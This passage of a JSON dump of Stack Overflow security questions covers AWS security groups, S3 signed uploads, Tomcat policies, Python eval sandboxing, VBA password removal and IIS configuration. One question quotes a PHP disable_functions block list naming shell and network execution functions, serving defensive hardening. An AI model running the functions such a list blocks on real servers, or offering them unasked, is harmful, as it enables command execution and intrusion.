ingress\n</code></pre>\n\n<p>However, when I try to connect to port 6379 using redis-cli from a machine in the <code>app-server</code> group, I get a redis timeout error.</p>\n\n<p>If I explicitly add the elastic IP of the server I want to connect from, like this</p>\n\n<pre><code>PERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    CIDR    111.snip.25/32        ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    CIDR    222.snip.25/32        ingress\n</code></pre>\n\n<p>the redis-cli call works.  However, I want to be more flexible, and add the entire security group instead.</p>\n\n<p>The <a href=\"http://docs.amazonwebservices.com/AWSEC2/latest/UserGuide/using-network-security.html#security-group-examples\" rel=\"nofollow\">amazon docs</a> state</p>\n\n<blockquote>\n  <p>By specifying a security group as the source, you allow incoming traffic from all instances that belong to the source security group. The incoming traffic that you allow is based on the private IP addresses of the instances in the source security group. You might specify another security group in your account if you're creating a three-tier web service (see Creating a Three-Tier Web Service).</p>\n</blockquote>\n\n<p>This should work, no?  What am I doing wrong?</p>\n"},{"tags":["java","security","applet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13217050,"title":"how to make simple applet run without permission","body":"<p>I have created an applet and it doesn't access any client files or resources. So in my understanding i don't need to sign it.</p>\n\n<p>I am going to host that applet along with my website. My problem is that whenever browser runs that applet at start up it ask for permission. I want the applet to run without such permission.</p>\n\n<p>I have seen other applets that runs automatically in my browser.</p>\n\n<p>It's a simple applet, how can I achieve this?.</p>\n"},{"tags":["security","file-upload","amazon-s3"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":395,"score":0,"question_id":4820077,"title":"Questions regarding uploading files to Amazon S3 using browser based HTTP POST","body":"<p>I have a couple of questions regarding uploading files to Amazon S3 directly by the user using HTTP POST form generated by a JSP page</p>\n\n<ul>\n<li><p>The access key and the signature\nneeds to be exposed to the user to\nallow him to upload files from a JSP\nform. In the signature I have to set\nthe expiration time or else by\ndefault its valid for 15 minutes.</p>\n\n<p>i) Can the user use these details to    upload to S3 outside my portal to    update his files or update/modify    others files.</p>\n\n<p>ii). How can I set the policy to avoid this ?</p></li>\n<li><p>Can the user use the signature for\nmultiple requests ? If yes how to\nstop the user from doing multiple\nuploads ? How do I ensure that the\nuser can use this signature with a\nrequest only once ?</p></li>\n<li><p>Sometimes there might be problems at\nAmazon S3 with latencies and uploads.\nIf the response from S3 takes time\nand the user tries to upload the file\nagain. He will receive a exception,\nhow can I handle this ?</p></li>\n</ul>\n\n<p>thanks</p>\n"},{"tags":["asp.net","security","eventvalidation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3178,"score":1,"question_id":5764875,"title":"se the ClientScriptManager.RegisterForEventValidation method in order to register the postback or callback data for validation","body":"<p>guys, I have a usercontrol in my asp.net 3.5 application and I am passing some plain text on button click event. button is situated in the usercontrol. but when I fire the event, I am getting the following error;</p>\n\n<blockquote>\n  <p>Invalid postback or callback argument.\n  Event validation is enabled using\n  \n  in configuration or &lt;%@ Page\n  EnableEventValidation=\"true\" %> in a\n  page.  For security purposes, this\n  feature verifies that arguments to\n  postback or callback events originate\n  from the server control that\n  originally rendered them.  If the data\n  is valid and expected, use the\n  ClientScriptManager.RegisterForEventValidation\n  method in order to register the\n  postback or callback data for\n  validation.</p>\n</blockquote>\n\n<p>when I set the EnableEventValidation=\"false\" to web form page like blow. it fires the event;</p>\n\n<pre><code>&lt;%@ Page EnableEventValidation=\"false\" %&gt;\n</code></pre>\n\n<p>but I am thinking that it shouldn't be a good idea to set that false. So, what is the alternative here? there error saying that <strong><em>'use the ClientScriptManager.RegisterForEventValidation method in order to register the postback or callback data for validation.</em></strong>' but where am I gonna register that thing? thanks !</p>\n\n<p>Also, I am using some AjaxControlToolkit controls inside my usercontrol and some jquery stuff.</p>\n"},{"tags":["ruby-on-rails","security","github","privacy"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":179,"score":2,"question_id":5047864,"title":"What tools do you use to avoid accidently pushing private information to a github repo on a rails project?","body":"<p>Are there any tools you use to scrub your project before pushing to a public github repo. How do you maintain your private settings, while pushing your source code to a public repo? What is the best practice?</p>\n"},{"tags":["c#","html","asp.net-mvc","security"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":73,"score":3,"question_id":13212097,"title":"Can I securely replace new lines with break tags like this?","body":"<p>Can I securely replace <code>Environment.NewLine</code> with <code>&lt;br /&gt;</code> like I am in the following extension method?</p>\n\n<pre><code>public static string HtmlBreaks(this string s)\n{\n    if (string.IsNullOrEmpty(s)) { return s; }\n    return s.Replace(Environment.NewLine, \"&lt;br /&gt;\");\n}\n</code></pre>\n\n<p>I use it like this:</p>\n\n<pre><code>@Html.Raw(Model.Details.HtmlBreaks())\n</code></pre>\n\n<p>And let me be clearer. <strong><em>Is this secure?</em></strong> <em><strong>Am I breaking any internet security guidelines by replacing text with HTML and then issuing the <code>Raw</code> method?</em></strong> Am I opening this website up to any attacks by this?</p>\n"},{"tags":["java","mysql","security","hibernate","tomcat"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1049,"score":1,"question_id":6290015,"title":"Tomcat security manager - c3p0 and hibernate","body":"<p>I am using a Tomcat security enabled server, and Hibernate3 with c3p0.\nHere are my policies in catalina.policy (I found these lines on the net and changed a bit):</p>\n\n<pre><code>grant codeBase \"file:${catalina.base}/webapps/omiccir/-\" \n{\n\n    /////////////// FilePermission ////////// \n    permission java.io.FilePermission \"${catalina.home}/log4j.properties\", \"read\"; \n    permission java.io.FilePermission \"${catalina.home}/logging.properties\", \"read\"; \n    permission java.io.FilePermission \"${catalina.home}/hibernate.properties\", \"read\"; \n    permission java.io.FilePermission \"${java.home}/lib/xerces.properties\", \"read\"; \n    //permission java.io.FilePermission \"opproject.log\", \"write\"; \n    //permission java.io.FilePermission \"${catalina.home}/Onepoint Project Home/-\", \"read, write, delete\"; \n\n\n    // FIXME line below is VERY system specific, take care! \n    permission java.io.FilePermission \"/tmp/tomcat6-tmp\", \"write\"; \n\n\n    // thought it was java.io.tmpdir, but may be wrong // \n    permission java.io.FilePermission \"${java.io.tmpdir}/tomcat6-tmp\", \"write\"; \n\n\n    /////////////// LoggingPermission ////////// \n    permission java.util.logging.LoggingPermission \"control\"; \n\n\n    /////////////// PropertyPermission ////////// \n    permission java.util.PropertyPermission \"org.apache.cxf.Logger\", \"read\"; \n    permission java.util.PropertyPermission \"org.apache.commons.logging.*\", \"read\"; \n    permission java.util.PropertyPermission \"log4j.*\", \"read\"; \n    permission java.util.PropertyPermission \"logger.home\", \"read\"; \n    permission java.util.PropertyPermission \"user.*\", \"read\"; \n    permission java.util.PropertyPermission \"org.apache.xerces.*\", \"read\"; \n    permission java.util.PropertyPermission \"ONEPOINT_PROJECT_HOME\", \"read\"; \n    permission java.util.PropertyPermission \"com.sun.xml.bind.v2.*\", \"read\"; \n    permission java.util.PropertyPermission \"com.sun.xml.bind.v2.runtime.JAXBContextImpl.fastBoot\", \"write\"; \n    permission java.util.PropertyPermission \"cglib.debugLocation\", \"read\"; \n    permission java.util.PropertyPermission \"org.dom4j.*\", \"read\"; \n    permission java.util.PropertyPermission \"c3p0.*\", \"read\"; \n    permission java.util.PropertyPermission \"net.sf.ehcache.*\", \"read\"; \n    permission java.util.PropertyPermission \"ANTLR_DO_NOT_EXIT\", \"read\"; \n    permission java.util.PropertyPermission \"ANTLR_USE_DIRECT_CLASS_LOADING\", \"read\"; \n\n\n    /////////////// RuntimePermission ////////// \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.jdbc.odbc\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.org.apache.tomcat.util.http\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.org.apache.tomcat.util.http.res\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.reflect.generics.reflectiveObjects\"; \n    permission java.lang.RuntimePermission \"accessClassInPackage.sun.util.calendar\"; \n    permission java.lang.RuntimePermission \"defineClassInPackage.java.lang\"; \n    permission java.lang.RuntimePermission \"getClassLoader\"; \n    permission java.lang.RuntimePermission \"getProtectionDomain\"; \n\n\n\n    /////////////// ReflectPermission ////////// \n    permission java.lang.reflect.ReflectPermission \"suppressAccessChecks\"; \n\n    permission java.net.SocketPermission \"*\", \"resolve\"; \n    permission java.net.SocketPermission \"localhost:5432\", \"connect,resolve\"; \n\n    //What is this line??\n    //permission java.net.SocketPermission \"www.onepoint.at:80\", \"connect,resolve\"; \n\n\n    /////////////// MBean...Permission ///////// \n    permission javax.management.MBeanServerPermission \"createMBeanServer\"; \n    permission javax.management.MBeanPermission \"com.mchange.v2.c3p0.*\", \"*\"; \n    permission javax.management.MBeanTrustPermission \"register\"; \n\n\n    permission java.util.PropertyPermission \"*\", \"read,write\"; \n}\n</code></pre>\n\n<p>I don't know what is wrong, but it seems that there is a problem with c3p0, and this goes away when I use Tomcat without a security manager.</p>\n\n<p>This is my stack trace:</p>\n\n<pre><code>org.apache.jasper.JasperException: org.hibernate.exception.GenericJDBCException: Cannot open connection\n    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:491)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:419)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\norg.hibernate.exception.GenericJDBCException: Cannot open connection\n    org.hibernate.exception.SQLStateConverter.handledNonSpecificException(SQLStateConverter.java:140)\n    org.hibernate.exception.SQLStateConverter.convert(SQLStateConverter.java:128)\n    org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:66)\n    org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:52)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:449)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\njava.sql.SQLException: Connections could not be acquired from the underlying database!\n    com.mchange.v2.sql.SqlUtils.toSQLException(SqlUtils.java:106)\n    com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:529)\n    com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:128)\n    org.hibernate.connection.C3P0ConnectionProvider.getConnection(C3P0ConnectionProvider.java:78)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:446)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\ncom.mchange.v2.resourcepool.CannotAcquireResourceException: A ResourcePool could not acquire a resource from its primary factory or source.\n    com.mchange.v2.resourcepool.BasicResourcePool.awaitAvailable(BasicResourcePool.java:1319)\n    com.mchange.v2.resourcepool.BasicResourcePool.prelimCheckoutResource(BasicResourcePool.java:557)\n    com.mchange.v2.resourcepool.BasicResourcePool.checkoutResource(BasicResourcePool.java:477)\n    com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:525)\n    com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:128)\n    org.hibernate.connection.C3P0ConnectionProvider.getConnection(C3P0ConnectionProvider.java:78)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:446)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n</code></pre>\n"},{"tags":["python","security","eval"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":396,"score":3,"question_id":1994071,"title":"How safe is expression evaluation using eval?","body":"<p>I am building a website where I have a need that user should be able to evaluate some expression based from the value in DB tables, instead of using tools like pyparsing etc, I am thinking of using python itself, and have come up with a solution which is sufficient for my purpose. I am basically using eval to evaluate the expression and passing globals dict with empty <code>__builtins__</code> so that nothing can be accessed and a locals dict for values from DB, if user will need some functions I can pass those too e.g.</p>\n\n<pre><code>import datetime\ndef today():\n    return datetime.datetime.now()\n\nexpression = \"\"\" first_name.lower() == \"anurag\" and today().year == 2010 \"\"\"\n\nprint eval(expression, {'__builtins__':{}}, {'first_name':'Anurag', 'today':today})\n</code></pre>\n\n<p>So my question is how safe it would be , I have three criteria</p>\n\n<ol>\n<li>Can user access current state of my program or table etc someshow?</li>\n<li>Can user have access to os level calls?</li>\n<li>Can user halt my system by looping or using much memory e.g. by doing range(10*8), in some cases he can e.g 100**1000 etc so 3 is not so much of a problem. i may check such op with tokenize and anyway I will be using GAE so it is not not much of concern.</li>\n</ol>\n\n<p><strong>Edit</strong>: IMO this is not the duplicate of <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Q:661084</a> because where it ends this one starts, I want to know even with <code>__builtins__</code> blocked, can user do bad things?</p>\n"},{"tags":["python","security"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":712,"score":2,"question_id":28369,"title":"Is \"safe_eval\" really safe?","body":"<p>I'm looking for a \"safe\" eval function, to implement spreadsheet-like calculations (using numpy/scipy).</p>\n\n<p>The functionality to do this (the <a href=\"http://docs.python.org/lib/module-rexec.html\" rel=\"nofollow\">rexec module</a>) has been removed from Python since 2.3 due to apparently unfixable security problems. There are several third-party hacks out there that purport to do this - the most thought-out solution that I have found is \n<a href=\"http://code.activestate.com/recipes/496746/\" rel=\"nofollow\">this Python Cookbok recipe</a>, \"safe_eval\". </p>\n\n<p>Am I reasonably safe if I use this (or something similar), to protect from malicious code, or am I stuck with writing my own parser? Does anyone know of any better alternatives?</p>\n\n<p>EDIT: I just discovered <a href=\"http://pypi.python.org/pypi/RestrictedPython\" rel=\"nofollow\">RestrictedPython</a>, which is part of Zope. Any opinions on this are  welcome.</p>\n"},{"tags":["asp.net","windows","security","iis7"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13205555,"title":"Web application can't be accessed from outside our network","body":"<p>We developed an ASP.Net application that is now residing on a Windows 7 Home Premium computer.</p>\n\n<p>Users who are on the same network can access this application but users from outside of the network can't access it. They just get a message in their browser that the page can't be found.</p>\n\n<p>Can you tell us how to enable the computer so the application is accessible outside of our network so it's an Internet application?</p>\n\n<p>So far we disabled the Windows firewall and made sure the port for the virtual directory that contains the web application is open for incoming and outgoing traffic.</p>\n"},{"tags":["security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13211458,"title":"Symfony2: Security/Routing Issue","body":"<p>Im using FOSFacebookBundle and FOSUserBundle on Symfony 2.1.3. Have some troubles with my security settings:</p>\n\n<pre><code>imports:    \n  - { resource: facebookParameters.ini }\n\nsecurity:\n  providers:\n    my_fos_facebook_provider:\n        id: my.facebook.user            \n  firewalls:\n    main:\n        pattern: ^/\n        fos_facebook:\n            app_url: %facebookAppUrl%\n            server_url: %facebookServerUrl%\n            login_path: /login\n            check_path: /login_fb_check\n            default_target_path: /\n            provider: my_fos_facebook_provider\n        logout:\n            handlers: [\"fos_facebook.logout_handler\"]\n        anonymous:    true\n  access_control:\n    - { path: ^/game, roles: ROLE_FACEBOOK }\n    - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/gameinfos, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n</code></pre>\n\n<p>Path game should be secured by facebook login, path login and gameinfos should be free to all visitors. Ok login is fine, its accessable from everywhere, but gameinfos is not. It allways directs me to facebook when i call the path / route.\nWhere could be the problem?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13209383,"title":"Block php functions which are not suppose to use publicly","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3115559/exploitable-php-functions\">Exploitable PHP functions</a>  </p>\n</blockquote>\n\n\n\n<p>My question is about <strong>disable_functions</strong>. May I ask for a list of functions that are vulnerable for online users when they are using online PHP editor. Like <a href=\"http://writecodeonline.com/php/\" rel=\"nofollow\">http://writecodeonline.com/php/</a> this editor blocks many functions. I have found few of them that are</p>\n\n<blockquote>\n  <p>disable_functions = apache_child_terminate, apache_setenv, define_syslog_variables, escapeshellarg, escapeshellcmd, eval, exec, dl, fsocket, pfsockopen, fsockopen, fp, fput, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, highlight_file, ini_alter, ini_get_all, ini_restore, inject_code, mysql_pconnect, openlog, phpinfo, passthru, php_uname, phpAds_remoteInfo, phpAds_XmlRpc, phpAds_xmlrpcDecode, phpAds_xmlrpcEncode, popen, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_setuid, posix_uname, proc_close, proc_get_status, proc_nice, proc_open, proc_terminate, shell_exec, syslog, system, system,proc_open, symlink, xmlrpc_entity_decode, popen, curl_exec, curl_multi_exec, parse_ini_file, show_source </p>\n</blockquote>\n\n<p>Thanks to <a href=\"http://www.jonboy60.com/2010/05/04/disable_function-on-php-ini/\" rel=\"nofollow\">http://www.jonboy60.com/2010/05/04/disable_function-on-php-ini/</a></p>\n"},{"tags":["security","hash","cryptography","unique"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13203363,"title":"Possibility of Two Hashes with same collision","body":"<p>Is there a way to prove/create (or are there known hash functions) 2 hash functions that never have the same collision?   I mean, like provable in way that someone who took 1 cryptography class in university can prove.  </p>\n\n<p>For example, I want hash functions A and B such that if hash function A collides on X and Y, then B will not collide on X and Y.</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13208199,"title":"Prevent people from accessing your classes and include files directly","body":"<p>I'm making my own MVC framework and I remember seeing something like this in phpBB forums index page code:</p>\n\n<pre><code>define('IN_PHPBB', true);\n</code></pre>\n\n<p>and then in the files that are only ment to be included and not directly accessed it has this at the top:</p>\n\n<pre><code>if(!defined('IN_PHPBB')) {\n    die();\n}\n</code></pre>\n\n<p>I was wondering if that is neccessary especially with class files because if they are directly accessed they won't run anyway since they were not instantiated.</p>\n"},{"tags":["c#",".net","security","certificate","x509certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":13206654,"title":"Certificates - More than 1 serial number?","body":"<p>weird : </p>\n\n<p>I use this code to find certificate via c# by this code : </p>\n\n<pre><code> X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);\n store.Open(OpenFlags.ReadOnly | OpenFlags.OpenExistingOnly);\n var certificates = store.Certificates;\n X509Certificate2Collection certificateCollection = store.Certificates.Find(X509FindType.FindBySerialNumber, \"the Serial Number\", false);\n</code></pre>\n\n<p>So I tested to see by an existing certificate : </p>\n\n<p><img src=\"http://i.stack.imgur.com/b2upF.jpg\" alt=\"enter image description here\"></p>\n\n<p>but it didn't worked (as mentioned in the linked question). ( Also tried  , remove spaces , capital etc... - non worked).</p>\n\n<p>But when I played with it a bit I found <strong>another serial location</strong> : </p>\n\n<p><img src=\"http://i.stack.imgur.com/WS4TB.jpg\" alt=\"enter image description here\"></p>\n\n<p>this time just pasted the exact phrase  <code>\"4e a1 ae 96 ec 1a b6 82 4e f6 23 9a 16 04 1a 51\"</code> and it <strong>worked</strong> .</p>\n\n<p>What is going on here ? </p>\n\n<p>why there are 2 different serial numbers and what are the differences between them  ? </p>\n\n<p><em>p.s. , However , not all certificates has the \"Authority Key Identifier \" , so there's still a problem finding by other properties...</em></p>\n"},{"tags":["security","excel","vba","password-protection"],"answer_count":5,"favorite_count":4,"up_vote_count":8,"down_vote_count":0,"view_count":41884,"score":8,"question_id":272503,"title":"How do I remove the password from a VBA project?","body":"<p>How can I programmatically remove a (known) password from an Excel VBA project?</p>\n\n<p>To be clear: I want to remove the password from the VBA Project, not the workbook or any worksheets.</p>\n"},{"tags":["ruby-on-rails","security","recaptcha","spam"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13186472,"title":"Security issue: bypassing reCaptcha in Rails 3.1","body":"<p>I don't understand how they succeed to post so much spam even though I have recaptcha working (if verify_recaptcha...) Here's what I have in controller:</p>\n\n<pre><code>def create\n    @comment = Comment.new(params[:comment])\n\n    respond_to do |format|\n      if verify_recaptcha(:model =&gt; @post, :message =&gt; \"Oh! There's a problem with reCAPTCHA's input!\")\n        if @comment.save\n          #flash[:submit_notice] = 'Comment was successfully created.'\n          Notifications.comment_notification(@comment).deliver\n          format.html { redirect_to(:back) }\n        else\n          format.html { redirect_to(@comment) }\n        end\n      end\n    end\n  end\n</code></pre>\n\n<p>And here's what I see in production.log:</p>\n\n<pre><code>Started POST \"/en/comments\" for 199.15.234.180 at 2012-11-01 19:50:48 +0200\nProcessing by CommentsController#create as */*\n  Parameters: {\"utf8\"=&gt;\"&amp;#x2713;\", \"authenticity_token\"=&gt;\"yFrJyx7EPCG9d29+PEbkNOHlUpuyXIVSy5acGNOO0mU=\", \"comment\"=&gt;{\"pos.....\n</code></pre>\n\n<p>Spam HTML follows. To my understanding, \"as */*\" is not HTML, which is a \"normal\" POST request. So I'm guessing the problem is somewhere there. Tried to google for */* didn't find anything. So what the heck is that?</p>\n\n<p><strong>UPDATE: [SOLVED]</strong></p>\n\n<p>It looks like not an issue, just someone who's bored persistently posts SPAM comments and solves reCaptchas (or maybe machine learning has advanced so far?). Probably Mollom is the next thing to add there :)</p>\n"},{"tags":["java","security","ssl","bouncycastle","digital-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13207378,"title":"Saving certificate chain in a pkcs12 keystore","body":"<p>The following code: </p>\n\n<pre><code>//used Bouncy Castle provider for keyStore\nkeyStore.setKeyEntry(alias, (Key)keyPair.getPrivate(), pwd, certChain);  \n</code></pre>\n\n<p>where certChain holds the end certificate and the issuer certificate (i.e. two certificates),<br>\ndoesn't save the issuer certificate as part of the chain in the saved to the file system keystore file if the keyStore is an instance of <code>PKCS12</code>.  </p>\n\n<p>It does save both certificates if the keystore type is <code>PKCS12-3DES-3DES</code>.\nWhy is this? Doesn't a PKCS12 suppose to have both certificates are part of the chain?</p>\n"},{"tags":["asp.net","security","iis","iis6"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13202184,"title":"Preventing asp.net pages from executing in a sub-folder","body":"<p>I have a dotnet site which contains a virtual directory (/ArticleImages) which maps to a file share on another server.  The file share is accessible to a large number of people so, as a security measure, I do not want any asp.net pages to execute in this folder (e.g. putting default.aspx in the file share and browsing to site.com/ArticleImages/default.aspx should either not serve or, preferably, serve as a simple download rather than executing).</p>\n\n<p>I'm using IIS 6.0 and added the virtual directory.  If I remove the application from this folder, it uses the parent application and complains that it can't read web.config.  If I add an application to this folder, even if I remove all application extensions, it complains that svc-xyzzy (the account used to access the share) 